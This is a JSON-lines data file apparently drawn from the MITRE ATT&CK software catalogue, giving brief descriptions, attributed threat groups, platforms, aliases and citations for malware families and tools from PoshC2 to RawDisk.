{"ID":"S0378","name":"PoshC2","description":"[PoshC2](https://attack.mitre.org/software/S0378) is an open source remote administration and post-exploitation framework that is publicly available on GitHub. The server-side components of the tool are primarily written in Python, while the implants are written in [PowerShell](https://attack.mitre.org/techniques/T1059/001). Although [PoshC2](https://attack.mitre.org/software/S0378) is primarily focused on Windows implantation, it does contain a basic Python dropper for Linux/macOS.(Citation: GitHub PoshC2)","url":"https://attack.mitre.org/software/S0378","created":"23 April 2019","last modified":"03 June 2022","version":"1.3","contributors":null,"platforms":"Linux, Windows, macOS","aliases":null,"type":"tool","relationship citations":"(Citation: Symantec Elfin Mar 2019),(Citation: SecureWorks August 2019),(Citation: FireEye APT33 Guardrail),,(Citation: GitHub PoshC2),(Citation: SecureWorks August 2019)"}
{"ID":"S1046","name":"PowGoop","description":"[PowGoop](https://attack.mitre.org/software/S1046) is a loader that consists of a DLL loader and a PowerShell-based downloader; it has been used by [MuddyWater](https://attack.mitre.org/groups/G0069) as their main loader.(Citation: DHS CISA AA22-055A MuddyWater February 2022)(Citation: CYBERCOM Iranian Intel Cyber January 2022)","url":"https://attack.mitre.org/software/S1046","created":"29 September 2022","last modified":"17 October 2022","version":"1.0","contributors":"Ozer Sarilar, @ozersarilar, STM","platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: DHS CISA AA22-055A MuddyWater February 2022),,(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: CYBERCOM Iranian Intel Cyber January 2022)"}
{"ID":"S0177","name":"Power Loader","description":"[Power Loader](https://attack.mitre.org/software/S0177) is modular code sold in the cybercrime market used as a downloader in malware families such as Carberp, Redyms and Gapz. (Citation: MalwareTech Power Loader Aug 2013) (Citation: WeLiveSecurity Gapz and Redyms Mar 2013)","url":"https://attack.mitre.org/software/S0177","created":"16 January 2018","last modified":"17 October 2018","version":"1.0","contributors":null,"platforms":null,"aliases":null,"type":"malware","relationship citations":",,(Citation: WeLiveSecurity Gapz and Redyms Mar 2013),(Citation: MalwareTech Power Loader Aug 2013)"}
{"ID":"S0139","name":"PowerDuke","description":"[PowerDuke](https://attack.mitre.org/software/S0139) is a backdoor that was used by [APT29](https://attack.mitre.org/groups/G0016) in 2016. It has primarily been delivered through Microsoft Word or Excel attachments containing malicious macros. (Citation: Volexity PowerDuke November 2016)","url":"https://attack.mitre.org/software/S0139","created":"31 May 2017","last modified":"30 March 2020","version":"1.2","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Volexity PowerDuke November 2016),,(Citation: Volexity PowerDuke November 2016)"}
{"ID":"S1012","name":"PowerLess","description":"[PowerLess](https://attack.mitre.org/software/S1012) is a PowerShell-based modular backdoor that has been used by [Magic Hound](https://attack.mitre.org/groups/G0059) since at least 2022.(Citation: Cybereason PowerLess February 2022)","url":"https://attack.mitre.org/software/S1012","created":"01 June 2022","last modified":"28 March 2023","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Cybereason PowerLess February 2022),,(Citation: Cybereason PowerLess February 2022)"}
{"ID":"S0685","name":"PowerPunch","description":"[PowerPunch](https://attack.mitre.org/software/S0685) is a lightweight downloader that has been used by [Gamaredon Group](https://attack.mitre.org/groups/G0047) since at least 2021.(Citation: Microsoft Actinium February 2022)","url":"https://attack.mitre.org/software/S0685","created":"18 February 2022","last modified":"22 March 2023","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Microsoft Actinium February 2022),,(Citation: Microsoft Actinium February 2022)"}
{"ID":"S0441","name":"PowerShower","description":"[PowerShower](https://attack.mitre.org/software/S0441) is a PowerShell backdoor used by [Inception](https://attack.mitre.org/groups/G0100) for initial reconnaissance and to download and execute second stage payloads.(Citation: Unit 42 Inception November 2018)(Citation: Kaspersky Cloud Atlas August 2019)","url":"https://attack.mitre.org/software/S0441","created":"08 May 2020","last modified":"20 May 2020","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Unit 42 Inception November 2018),,(Citation: Unit 42 Inception November 2018),(Citation: Kaspersky Cloud Atlas August 2019)"}
{"ID":"S0194","name":"PowerSploit","description":"[PowerSploit](https://attack.mitre.org/software/S0194) is an open source, offensive security framework comprised of [PowerShell](https://attack.mitre.org/techniques/T1059/001) modules and scripts that perform a wide range of tasks related to penetration testing such as code execution, persistence, bypassing anti-virus, recon, and exfiltration. (Citation: GitHub PowerSploit May 2012) (Citation: PowerShellMagazine PowerSploit July 2014) (Citation: PowerSploit Documentation)","url":"https://attack.mitre.org/software/S0194","created":"18 April 2018","last modified":"22 March 2023","version":"1.6","contributors":null,"platforms":"Windows","aliases":null,"type":"tool","relationship citations":"(Citation: CrowdStrike Carbon Spider August 2021),(Citation: TrendMicro EarthLusca 2022),(Citation: TrendMicro POWERSTATS V3 June 2019),(Citation: FireEye APT33 Guardrail),(Citation: Cymmetria Patchwork),(Citation: FireEye APT41 Aug 2019),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: NCC Group TA505),(Citation: CISA AA21-200A APT40 July 2021),(Citation: FoxIT Wocao December 2019),(Citation: BlackBerry CostaRicto November 2020),(Citation: PowerSploit Documentation),(Citation: GitHub PowerSploit May 2012),(Citation: Harmj0y Kerberoast Nov 2016),(Citation: Pentestlab Stored Credentials),(Citation: PowerSploit Invoke Kerberoast)"}
{"ID":"S0393","name":"PowerStallion","description":"[PowerStallion](https://attack.mitre.org/software/S0393) is a lightweight [PowerShell](https://attack.mitre.org/techniques/T1059/001) backdoor used by [Turla](https://attack.mitre.org/groups/G0010), possibly as a recovery access tool to install other backdoors.(Citation: ESET Turla PowerShell May 2019)","url":"https://attack.mitre.org/software/S0393","created":"21 June 2019","last modified":"09 February 2021","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: ESET Turla PowerShell May 2019),,(Citation: ESET Turla PowerShell May 2019)"}
{"ID":"S1058","name":"Prestige","description":"[Prestige](https://attack.mitre.org/software/S1058) ransomware has been used by [Sandworm Team](https://attack.mitre.org/groups/G0034) since at least March 2022, including against transportation and related logistics industries in Ukraine and Poland in October 2022.(Citation: Microsoft Prestige ransomware October 2022)","url":"https://attack.mitre.org/software/S1058","created":"20 January 2023","last modified":"24 February 2023","version":"1.0","contributors":"Mindaugas Gudzis, BT Security","platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Microsoft Prestige ransomware October 2022),,(Citation: Microsoft Prestige ransomware October 2022)"}
{"ID":"S0113","name":"Prikormka","description":"[Prikormka](https://attack.mitre.org/software/S0113) is a malware family used in a campaign known as Operation Groundbait. It has predominantly been observed in Ukraine and was used as early as 2008. (Citation: ESET Operation Groundbait)","url":"https://attack.mitre.org/software/S0113","created":"31 May 2017","last modified":"19 April 2022","version":"1.3","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: ESET Operation Groundbait)"}
{"ID":"S0654","name":"ProLock","description":"[ProLock](https://attack.mitre.org/software/S0654) is a ransomware strain that has been used in Big Game Hunting (BGH) operations since at least 2020, often obtaining initial access with [QakBot](https://attack.mitre.org/software/S0650). [ProLock](https://attack.mitre.org/software/S0654) is the successor to PwndLocker ransomware which was found to contain a bug allowing decryption without ransom payment in 2019.(Citation: Group IB Ransomware September 2020)","url":"https://attack.mitre.org/software/S0654","created":"30 September 2021","last modified":"15 October 2021","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: Group IB Ransomware September 2020)"}
{"ID":"S0279","name":"Proton","description":"[Proton](https://attack.mitre.org/software/S0279) is a macOS backdoor focusing on data theft and credential access  (Citation: objsee mac malware 2017).","url":"https://attack.mitre.org/software/S0279","created":"17 October 2018","last modified":"22 January 2021","version":"1.2","contributors":null,"platforms":"macOS","aliases":null,"type":"malware","relationship citations":",,(Citation: objsee mac malware 2017)"}
{"ID":"S0238","name":"Proxysvc","description":"[Proxysvc](https://attack.mitre.org/software/S0238) is a malicious DLL used by [Lazarus Group](https://attack.mitre.org/groups/G0032) in a campaign known as Operation GhostSecret. It has appeared to be operating undetected since 2017 and was mostly observed in higher education organizations. The goal of [Proxysvc](https://attack.mitre.org/software/S0238) is to deliver additional payloads to the target and to maintain control for the attacker. It is in the form of a DLL that can also be executed as a standalone process. (Citation: McAfee GhostSecret)","url":"https://attack.mitre.org/software/S0238","created":"17 October 2018","last modified":"30 March 2020","version":"1.2","contributors":"Edward Millington","platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: McAfee GhostSecret),,(Citation: McAfee GhostSecret)"}
{"ID":"S0029","name":"PsExec","description":"[PsExec](https://attack.mitre.org/software/S0029) is a free Microsoft tool that can be used to execute a program on another computer. It is used by IT administrators and attackers.(Citation: Russinovich Sysinternals)(Citation: SANS PsExec)","url":"https://attack.mitre.org/software/S0029","created":"31 May 2017","last modified":"02 March 2023","version":"1.4","contributors":"Janantha Marasinghe","platforms":"Windows","aliases":null,"type":"tool","relationship citations":"(Citation: Dragos Crashoverride 2018),(Citation: NCC Group Chimera January 2021),(Citation: Mandiant APT1),(Citation: Symantec Dragonfly Sept 2017),(Citation: Mandiant FIN5 GrrCON Oct 2016),(Citation: Symantec Thrip June 2018),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: FireEye APT39 Jan 2019),(Citation: Symantec Leafminer July 2018),(Citation: Kaspersky Carbanak),(Citation: FireEye KEGTAP SINGLEMALT October 2020),(Citation: Check Point Pay2Key November 2020),(Citation: Microsoft GALLIUM December 2019),(Citation: US-CERT TA18-074A),(Citation: Symantec Waterbug Jun 2019),(Citation: Dragos Xenotime 2018),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Symantec Palmerworm Sep 2020),(Citation: Baumgartner Naikon 2015),(Citation: FireEye TRITON 2019),(Citation: FireEye FIN6 April 2016),(Citation: FireEye FIN6 Apr 2019),(Citation: Dell TG-1314),(Citation: Securelist DarkVishnya Dec 2018),(Citation: Volexity Exchange Marauder March 2021),(Citation: Netscout Stolen Pencil Dec 2018),(Citation: Symantec Chafer February 2018),(Citation: Gigamon Berserk Bear October 2021),(Citation: F-Secure The Dukes),(Citation: Group IB Cobalt Aug 2017),(Citation: BitDefender Chafer May 2020),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: Secureworks IRON LIBERTY July 2019),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: Cylance Cleaver),(Citation: PTSecurity Cobalt Group Aug 2017),(Citation: Cybereason Soft Cell June 2019),(Citation: ESET Dukes October 2019),(Citation: CrowdStrike Grim Spider May 2019),(Citation: FireEye APT10 April 2017),(Citation: FireEye APT35 2018),(Citation: Symantec WastedLocker June 2020),(Citation: McAfee Night Dragon),(Citation: ESET Dukes October 2019),(Citation: FoxIT Wocao December 2019),(Citation: BlackBerry CostaRicto November 2020),(Citation: Russinovich Sysinternals),(Citation: PsExec Russinovich),(Citation: NCC Group Fivehands June 2021)"}
{"ID":"S0078","name":"Psylo","description":"[Psylo](https://attack.mitre.org/software/S0078) is a shellcode-based Trojan that has been used by [Scarlet Mimic](https://attack.mitre.org/groups/G0029). It has similar characteristics as [FakeM](https://attack.mitre.org/software/S0076). (Citation: Scarlet Mimic Jan 2016)","url":"https://attack.mitre.org/software/S0078","created":"31 May 2017","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Scarlet Mimic Jan 2016),,(Citation: Scarlet Mimic Jan 2016)"}
{"ID":"S0147","name":"Pteranodon","description":"[Pteranodon](https://attack.mitre.org/software/S0147) is a custom backdoor used by [Gamaredon Group](https://attack.mitre.org/groups/G0047). (Citation: Palo Alto Gamaredon Feb 2017)","url":"https://attack.mitre.org/software/S0147","created":"31 May 2017","last modified":"23 August 2022","version":"2.1","contributors":null,"platforms":"Windows","aliases":"Pterodo","type":"malware","relationship citations":"(Citation: Palo Alto Gamaredon Feb 2017),(Citation: Symantec Shuckworm January 2022),(Citation: Secureworks IRON TILDEN Profile),(Citation: Unit 42 Gamaredon February 2022),(Citation: Microsoft Actinium February 2022),,(Citation: Symantec Shuckworm January 2022),(Citation: Palo Alto Gamaredon Feb 2017),(Citation: Unit 42 Gamaredon February 2022),(Citation: Microsoft Actinium February 2022)"}
{"ID":"S0192","name":"Pupy","description":"[Pupy](https://attack.mitre.org/software/S0192) is an open source, cross-platform (Windows, Linux, OSX, Android) remote administration and post-exploitation tool. (Citation: GitHub Pupy) It is written in Python and can be generated as a payload in several different ways (Windows exe, Python file, PowerShell oneliner/file, Linux elf, APK, Rubber Ducky, etc.). (Citation: GitHub Pupy) [Pupy](https://attack.mitre.org/software/S0192) is publicly available on GitHub. (Citation: GitHub Pupy)","url":"https://attack.mitre.org/software/S0192","created":"18 April 2018","last modified":"13 May 2020","version":"1.2","contributors":null,"platforms":"Android, Linux, Windows, macOS","aliases":null,"type":"tool","relationship citations":"(Citation: FireEye APT35 2018),(Citation: Unit 42 Magic Hound Feb 2017),(Citation: Secureworks Cobalt Gypsy Feb 2017),(Citation: FireEye APT33 Guardrail),,(Citation: GitHub Pupy)"}
{"ID":"S1032","name":"PyDCrypt","description":"[PyDCrypt](https://attack.mitre.org/software/S1032) is malware written in Python designed to deliver [DCSrv](https://attack.mitre.org/software/S1033). It has been used by [Moses Staff](https://attack.mitre.org/groups/G1009) since at least September 2021, with each sample tailored for its intended victim organization.(Citation: Checkpoint MosesStaff Nov 2021)","url":"https://attack.mitre.org/software/S1032","created":"11 August 2022","last modified":"24 October 2022","version":"1.0","contributors":"Hiroki Nagahama, NEC Corporation; Manikantan Srinivasan, NEC Corporation India; Pooja Natarajan, NEC Corporation India","platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Checkpoint MosesStaff Nov 2021),,(Citation: Checkpoint MosesStaff Nov 2021)"}
{"ID":"S0583","name":"Pysa","description":"[Pysa](https://attack.mitre.org/software/S0583) is a ransomware that was first used in October 2018 and has been seen to target particularly high-value finance, government and healthcare organizations.(Citation: CERT-FR PYSA April 2020)","url":"https://attack.mitre.org/software/S0583","created":"01 March 2021","last modified":"27 April 2021","version":"1.0","contributors":"Daniyal Naeem, BT Security","platforms":"Windows","aliases":"Mespinoza","type":"malware","relationship citations":",,(Citation: CERT-FR PYSA April 2020)"}
{"ID":"S0269","name":"QUADAGENT","description":"[QUADAGENT](https://attack.mitre.org/software/S0269) is a PowerShell backdoor used by [OilRig](https://attack.mitre.org/groups/G0049). (Citation: Unit 42 QUADAGENT July 2018)","url":"https://attack.mitre.org/software/S0269","created":"17 October 2018","last modified":"22 March 2023","version":"1.2","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Unit 42 QUADAGENT July 2018),,(Citation: GitHub Invoke-Obfuscation),(Citation: Unit 42 QUADAGENT July 2018)"}
{"ID":"S0650","name":"QakBot","description":"[QakBot](https://attack.mitre.org/software/S0650) is a modular banking trojan that has been used primarily by financially-motivated actors since at least 2007. [QakBot](https://attack.mitre.org/software/S0650) is continuously maintained and developed and has evolved from an information stealer into a delivery agent for ransomware, most notably [ProLock](https://attack.mitre.org/software/S0654) and [Egregor](https://attack.mitre.org/software/S0554).(Citation: Trend Micro Qakbot December 2020)(Citation: Red Canary Qbot)(Citation: Kaspersky QakBot September 2021)(Citation: ATT QakBot April 2021)","url":"https://attack.mitre.org/software/S0650","created":"27 September 2021","last modified":"01 May 2023","version":"1.1","contributors":"Edward Millington; Inna Danilevich, U.S. Bank","platforms":"Windows","aliases":"Pinkslipbot, QBot, QuackBot","type":"malware","relationship citations":"(Citation: ATT QakBot April 2021),,(Citation: Kaspersky QakBot September 2021),(Citation: Deep Instinct Black Basta August 2022),(Citation: Kroll Qakbot June 2020),(Citation: Cyberint Qakbot May 2021),(Citation: Crowdstrike Qakbot October 2020),(Citation: Trend Micro Qakbot May 2020),(Citation: Group IB Ransomware September 2020),(Citation: ATT QakBot April 2021),(Citation: Red Canary Qbot),(Citation: Trend Micro Black Basta October 2022),(Citation: Trend Micro Qakbot December 2020),(Citation: NCC Group Black Basta June 2022)"}
{"ID":"S0262","name":"QuasarRAT","description":"[QuasarRAT](https://attack.mitre.org/software/S0262) is an open-source, remote access tool that has been publicly available on GitHub since at least 2014. [QuasarRAT](https://attack.mitre.org/software/S0262) is developed in the C# language.(Citation: GitHub QuasarRAT)(Citation: Volexity Patchwork June 2018)","url":"https://attack.mitre.org/software/S0262","created":"17 October 2018","last modified":"02 August 2022","version":"2.0","contributors":"Kyaw Pyiyt Htet, @KyawPyiytHtet","platforms":"Windows","aliases":"xRAT","type":"tool","relationship citations":"(Citation: TrendMicro Patchwork Dec 2017),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Volexity Patchwork June 2018),(Citation: Unit 42 Gorgon Group Aug 2018),(Citation: Securelist APT10 March 2021),(Citation: DOJ APT10 Dec 2018),(Citation: Symantec Cicada November 2020),,(Citation: Volexity Patchwork June 2018),(Citation: GitHub QuasarRAT),(Citation: CISA AR18-352A Quasar RAT December 2018)"}
{"ID":"S0686","name":"QuietSieve","description":"[QuietSieve](https://attack.mitre.org/software/S0686) is an information stealer that has been used by [Gamaredon Group](https://attack.mitre.org/groups/G0047) since at least 2021.(Citation: Microsoft Actinium February 2022)","url":"https://attack.mitre.org/software/S0686","created":"18 February 2022","last modified":"15 April 2022","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Microsoft Actinium February 2022),,(Citation: Microsoft Actinium February 2022)"}
{"ID":"S0055","name":"RARSTONE","description":"[RARSTONE](https://attack.mitre.org/software/S0055) is malware used by the [Naikon](https://attack.mitre.org/groups/G0019) group that has some characteristics similar to [PlugX](https://attack.mitre.org/software/S0013). (Citation: Aquino RARSTONE)","url":"https://attack.mitre.org/software/S0055","created":"31 May 2017","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: CameraShy),(Citation: Baumgartner Naikon 2015),,(Citation: Camba RARSTONE),(Citation: Aquino RARSTONE)"}
{"ID":"S0241","name":"RATANKBA","description":"[RATANKBA](https://attack.mitre.org/software/S0241) is a remote controller tool used by [Lazarus Group](https://attack.mitre.org/groups/G0032). [RATANKBA](https://attack.mitre.org/software/S0241) has been used in attacks targeting financial institutions in Poland, Mexico, Uruguay, the United Kingdom, and Chile. It was also seen used against organizations related to telecommunications, management consulting, information technology, insurance, aviation, and education. [RATANKBA](https://attack.mitre.org/software/S0241) has a graphical user interface to allow the attacker to issue jobs to perform on the infected machines. (Citation: Lazarus RATANKBA) (Citation: RATANKBA)","url":"https://attack.mitre.org/software/S0241","created":"17 October 2018","last modified":"02 September 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Lazarus RATANKBA),,(Citation: RATANKBA),(Citation: Lazarus RATANKBA)"}
{"ID":"S0662","name":"RCSession","description":"[RCSession](https://attack.mitre.org/software/S0662) is a backdoor written in C++ that has been in use since at least 2018 by [Mustang Panda](https://attack.mitre.org/groups/G0129) and by [Threat Group-3390](https://attack.mitre.org/groups/G0027) (Type II Backdoor).(Citation: Secureworks BRONZE PRESIDENT December 2019)(Citation: Trend Micro Iron Tiger April 2021)(Citation: Trend Micro DRBControl February 2020)","url":"https://attack.mitre.org/software/S0662","created":"19 November 2021","last modified":"26 March 2023","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Secureworks BRONZE PRESIDENT December 2019),(Citation: Profero APT27 December 2020),(Citation: Trend Micro Iron Tiger April 2021),(Citation: Trend Micro DRBControl February 2020),,(Citation: Secureworks BRONZE PRESIDENT December 2019),(Citation: Profero APT27 December 2020),(Citation: Trend Micro DRBControl February 2020)"}
{"ID":"S0495","name":"RDAT","description":"[RDAT](https://attack.mitre.org/software/S0495) is a backdoor used by the suspected Iranian threat group [OilRig](https://attack.mitre.org/groups/G0049). [RDAT](https://attack.mitre.org/software/S0495) was originally identified in 2017 and targeted companies in the telecommunications sector.(Citation: Unit42 RDAT July 2020)","url":"https://attack.mitre.org/software/S0495","created":"28 July 2020","last modified":"15 October 2020","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Unit42 RDAT July 2020),,(Citation: Unit42 RDAT July 2020)"}
{"ID":"S0416","name":"RDFSNIFFER","description":"[RDFSNIFFER](https://attack.mitre.org/software/S0416) is a module loaded by [BOOSTWRITE](https://attack.mitre.org/software/S0415) which allows an attacker to monitor and tamper with legitimate connections made via an application designed to provide visibility and system management capabilities to remote IT techs.(Citation: FireEye FIN7 Oct 2019)","url":"https://attack.mitre.org/software/S0416","created":"11 October 2019","last modified":"16 October 2019","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: FireEye FIN7 Oct 2019),,(Citation: FireEye FIN7 Oct 2019)"}
{"ID":"S0496","name":"REvil","description":"[REvil](https://attack.mitre.org/software/S0496) is a ransomware family that has been linked to the [GOLD SOUTHFIELD](https://attack.mitre.org/groups/G0115) group and operated as ransomware-as-a-service (RaaS) since at least April 2019. [REvil](https://attack.mitre.org/software/S0496), which as been used against organizations in the manufacturing, transportation, and electric sectors, is highly configurable and shares code similarities with the GandCrab RaaS.(Citation: Secureworks REvil September 2019)(Citation: Intel 471 REvil March 2020)(Citation: Group IB Ransomware May 2020)","url":"https://attack.mitre.org/software/S0496","created":"04 August 2020","last modified":"26 March 2023","version":"2.1","contributors":"Edward Millington","platforms":"Windows","aliases":"Sodin, Sodinokibi","type":"malware","relationship citations":"(Citation: CrowdStrike Carbon Spider August 2021),(Citation: Secureworks REvil September 2019),(Citation: Secureworks GandCrab and REvil September 2019),(Citation: FBI Flash FIN7 USB),(Citation: IBM Ransomware Trends September 2020),,(Citation: Talos Sodinokibi April 2019),(Citation: Picus Sodinokibi January 2020),(Citation: Tetra Defense Sodinokibi March 2020),(Citation: Kaspersky Sodin July 2019),(Citation: Group IB Ransomware May 2020),(Citation: Secureworks REvil September 2019),(Citation: Secureworks GandCrab and REvil September 2019),(Citation: BleepingComputer REvil 2021),(Citation: McAfee Sodinokibi October 2019),(Citation: Cylance Sodinokibi July 2019),(Citation: McAfee REvil October 2019),(Citation: G Data Sodinokibi June 2019),(Citation: Intel 471 REvil March 2020)"}
{"ID":"S0258","name":"RGDoor","description":"[RGDoor](https://attack.mitre.org/software/S0258) is a malicious Internet Information Services (IIS) backdoor developed in the C++ language. [RGDoor](https://attack.mitre.org/software/S0258) has been seen deployed on webservers belonging to the Middle East government organizations. [RGDoor](https://attack.mitre.org/software/S0258) provides backdoor access to compromised IIS servers. (Citation: Unit 42 RGDoor Jan 2018)","url":"https://attack.mitre.org/software/S0258","created":"17 October 2018","last modified":"10 September 2021","version":"1.2","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Unit 42 RGDoor Jan 2018),,(Citation: Unit 42 RGDoor Jan 2018),(Citation: ESET IIS Malware 2021)"}
{"ID":"S0003","name":"RIPTIDE","description":"[RIPTIDE](https://attack.mitre.org/software/S0003) is a proxy-aware backdoor used by [APT12](https://attack.mitre.org/groups/G0005). (Citation: Moran 2014)","url":"https://attack.mitre.org/software/S0003","created":"31 May 2017","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Moran 2014),,(Citation: Moran 2014)"}
{"ID":"S0684","name":"ROADTools","description":"[ROADTools](https://attack.mitre.org/software/S0684) is a framework for enumerating Azure Active Directory environments. The tool is written in Python and publicly available on GitHub.(Citation: ROADtools Github)","url":"https://attack.mitre.org/software/S0684","created":"18 February 2022","last modified":"01 April 2022","version":"1.0","contributors":null,"platforms":null,"aliases":null,"type":"tool","relationship citations":"(Citation: MSTIC Nobelium Oct 2021),,(Citation: Roadtools)"}
{"ID":"S0112","name":"ROCKBOOT","description":"[ROCKBOOT](https://attack.mitre.org/software/S0112) is a [Bootkit](https://attack.mitre.org/techniques/T1542/003) that has been used by an unidentified, suspected China-based group. (Citation: FireEye Bootkits)","url":"https://attack.mitre.org/software/S0112","created":"31 May 2017","last modified":"09 February 2021","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: FireEye APT41 Aug 2019),,(Citation: FireEye Bootkits)"}
{"ID":"S0240","name":"ROKRAT","description":"[ROKRAT](https://attack.mitre.org/software/S0240) is a cloud-based remote access tool (RAT) used by [APT37](https://attack.mitre.org/groups/G0067) to target victims in South Korea. [APT37](https://attack.mitre.org/groups/G0067) has used ROKRAT during several campaigns from 2016 through 2021.(Citation: Talos ROKRAT)(Citation: Talos Group123)(Citation: Volexity InkySquid RokRAT August 2021)","url":"https://attack.mitre.org/software/S0240","created":"17 October 2018","last modified":"30 March 2022","version":"2.3","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Securelist ScarCruft May 2019),(Citation: Talos Group123),,(Citation: Talos ROKRAT),(Citation: NCCGroup RokRat Nov 2018),(Citation: Securelist ScarCruft May 2019),(Citation: Talos ROKRAT 2),(Citation: Talos Group123),(Citation: Volexity InkySquid RokRAT August 2021),(Citation: Malwarebytes RokRAT VBA January 2021)"}
{"ID":"S0148","name":"RTM","description":"[RTM](https://attack.mitre.org/software/S0148) is custom malware written in Delphi. It is used by the group of the same name ([RTM](https://attack.mitre.org/groups/G0048)). Newer versions of the malware have been reported publicly as Redaman.(Citation: ESET RTM Feb 2017)(Citation: Unit42 Redaman January 2019)","url":"https://attack.mitre.org/software/S0148","created":"31 May 2017","last modified":"29 July 2022","version":"1.2","contributors":"Arie Olshtein, Check Point; Kobi Eisenkraft, Check Point","platforms":"Windows","aliases":"Redaman","type":"malware","relationship citations":"(Citation: ESET RTM Feb 2017),,(Citation: CheckPoint Redaman October 2019),(Citation: ESET RTM Feb 2017),(Citation: Unit42 Redaman January 2019)"}
{"ID":"S0481","name":"Ragnar Locker","description":"[Ragnar Locker](https://attack.mitre.org/software/S0481) is a ransomware that has been in use since at least December 2019.(Citation: Sophos Ragnar May 2020)(Citation: Cynet Ragnar Apr 2020)","url":"https://attack.mitre.org/software/S0481","created":"29 June 2020","last modified":"13 April 2021","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: FBI Ragnar Locker 2020),(Citation: Sophos Ragnar May 2020),(Citation: Cynet Ragnar Apr 2020)"}
{"ID":"S0565","name":"Raindrop","description":"[Raindrop](https://attack.mitre.org/software/S0565) is a loader used by [APT29](https://attack.mitre.org/groups/G0016) that was discovered on some victim machines during investigations related to the [SolarWinds Compromise](https://attack.mitre.org/campaigns/C0024). It was discovered in January 2021 and was likely used since at least May 2020.(Citation: Symantec RAINDROP January 2021)(Citation: Microsoft Deep Dive Solorigate January 2021)","url":"https://attack.mitre.org/software/S0565","created":"19 January 2021","last modified":"27 March 2023","version":"1.2","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Secureworks IRON RITUAL Profile),(Citation: Symantec RAINDROP January 2021),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: Symantec RAINDROP January 2021),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: Symantec RAINDROP January 2021),(Citation: Microsoft Deep Dive Solorigate January 2021)"}
{"ID":"S0629","name":"RainyDay","description":"[RainyDay](https://attack.mitre.org/software/S0629) is a backdoor tool that has been used by [Naikon](https://attack.mitre.org/groups/G0019) since at least 2020.(Citation: Bitdefender Naikon April 2021)","url":"https://attack.mitre.org/software/S0629","created":"29 June 2021","last modified":"19 August 2021","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Bitdefender Naikon April 2021),,(Citation: Bitdefender Naikon April 2021)"}
{"ID":"S0458","name":"Ramsay","description":"[Ramsay](https://attack.mitre.org/software/S0458) is an information stealing malware framework designed to collect and exfiltrate sensitive documents, including from air-gapped systems. Researchers have identified overlaps between [Ramsay](https://attack.mitre.org/software/S0458) and the [Darkhotel](https://attack.mitre.org/groups/G0012)-associated Retro malware.(Citation: Eset Ramsay May 2020)(Citation: Antiy CERT Ramsay April 2020)","url":"https://attack.mitre.org/software/S0458","created":"27 May 2020","last modified":"14 April 2021","version":"1.1","contributors":"Harry Kim, CODEMIZE","platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: Eset Ramsay May 2020),(Citation: Antiy CERT Ramsay April 2020)"}
{"ID":"S0364","name":"RawDisk","description":"[RawDisk](https://attack.mitre.org/software/S0364) is a legitimate commercial driver from the EldoS Corporation that is used for interacting with files, disks, and partitions. The driver allows for direct modification of data on a local computer's hard drive. In some cases, the tool can enact these raw disk modifications from user-mode processes, circumventing Windows operating system security features.(Citation: EldoS RawDisk ITpro)(Citation: Novetta Blockbuster Destructive Malware)","url":"https://attack.mitre.org/software/S0364","created":"25 March 2019","last modified":"28 July 2022","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"tool","relationship citations":"(Citation: Novetta Blockbuster),(Citation: Novetta Blockbuster Destructive Malware),,(Citation: Palo Alto Shamoon Nov 2016),(Citation: Unit 42 Shamoon3 2018),(Citation: Novetta Blockbuster Destructive Malware)"}
